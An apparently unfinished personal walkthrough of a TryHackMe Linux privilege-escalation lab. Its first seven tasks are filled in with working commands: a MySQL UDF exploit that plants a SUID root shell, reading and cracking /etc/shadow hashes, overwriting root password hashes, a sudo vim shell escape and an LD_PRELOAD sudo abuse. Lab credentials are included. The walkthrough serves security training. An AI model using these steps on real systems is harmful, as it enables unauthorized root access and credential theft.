# THM - Linux PrivEsc

<br>

## Task 1

```shell
ssh -oHostKeyAlgorithms=+ssh-rsa user@10.10.168.170
	yes
	password321
```

### Task 1.2

```shell
	id
```

> uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

<br>

## Task 2

https://www.exploit-db.com/exploits/1518

```shell
	cd /home/user/tools/mysql-udf
	ls
	
	gcc -g -c raptor_udf2.c -fPIC
	gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	
	mysql -u root
		
		use mysql;
		create table foo(line blob);
		insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
		select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
		
		select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
		
		exit
		
	/tmp/rootbash -p
		
		whoami
		
		rm /tmp/rootbash
		exit
```

<br>

## Task 3

```shell
	ls -l /etc/shadow
```

### Task 3.1

```shell
	cat /etc/shadow
```

> $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

### Task 3.2

```shell
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt

haiti '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'
```

> sha512crypt

### Task 3.3

```shell
john hash.txt --format=sha512crypt --wordlist=../../Tools/KaliWordlists/rockyou.txt
```

> password123

```shell
(ssh:)
	su root
		password123
	
		exit
```

<br>

## Task 4

```shell
mkpasswd -m sha-512 DFTF@PConsole#
```

```shell
(ssh:)
	nano /etc/shadow
```

(edit:)
```txt
root:$6$q8SJ1T66Cx07PoNt$83RUZUNjggiqLeeQjogAH/K44raoNW0GHI864yctBtbqLQ3oZhCCCLcoR5rtEYQbY2y3uhyLqdzpaCyylTe.p.:17298:0:99999:7:::
```

```shell
(ssh:)
		^X
		y
		^Enter
	
	su root
		DFTF@PConsole#
	
		exit
```

<br>

## Task 5

```shell
openssl passwd DFTF-PConsole
```

```shell
(ssh:)
	nano /etc/passwd
```

```txt
root:$1$iCQE5h77$Oog3S0pqBpqTJIUKlff83/:0:0:root:/root:/bin/bash
```

```shell
(ssh:)
		^X
		y
		^Enter
	
	su root
		DFTF-PConsole
	
		exit
```

### Task 5.1

```shell
(ssh:)
		id
	
		exit
```

> uid=0(root) gid=0(root) groups=0(root)

<br>

## Task 6

### Task 6.1

```shell
(ssh:)
	sudo -l
```

> 11

### Task 6.2

🧰 https://gtfobins.github.io

> apache2

```shell
(ssh:)
	sudo vim -c ':!/bin/sh'
		whoami
	
		exit
		^Enter
		:q
		^Enter
```

<br>

## Task 7

```shell
(ssh:)
	sudo -l
		
	gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
	
	sudo LD_PRELOAD=/tmp/preload.so
	
	...
```

<br>

## Task 8

```shell
(ssh:)
	
```

<br>

## Task 9

```shell
(ssh:)
	
```

### Task 9.1

```shell
(ssh:)
	
```

> 

<br>

## Task 10

🧰 https://gtfobins.github.io/gtfobins/tar/

```shell
(ssh:)
	
```

<br>

## Task 11

🧰 https://www.exploit-db.com/

```shell
(ssh:)
	
```

<br>

## Task 12

```shell
(ssh:)
	
```

<br>

## Task 13

```shell
(ssh:)
	
```

<br>

## Task 14

```shell
(ssh:)
	
```

<br>

## Task 15

```shell
(ssh:)
	
```

<br>

## Task 16

```shell
(ssh:)
	
```

### Task 16.1

```shell
(ssh:)
	
```

> 

<br>

## Task 17

```shell
(ssh:)
	
```

### Task 17.1

```shell
(ssh:)
	
```

> 

<br>

## Task 18

```shell
(ssh:)
	
```

<br>

## Task 19

```shell
(ssh:)
	
```

### Task 19.1

```shell
(ssh:)
	
```

> 

<br>

## Task 20

```shell
(ssh:)
	
```

<br>

https://github.com/rebootuser/LinEnum

https://github.com/carlospolop/PEASS-ng

https://github.com/diego-treitos/linux-smart-enumeration

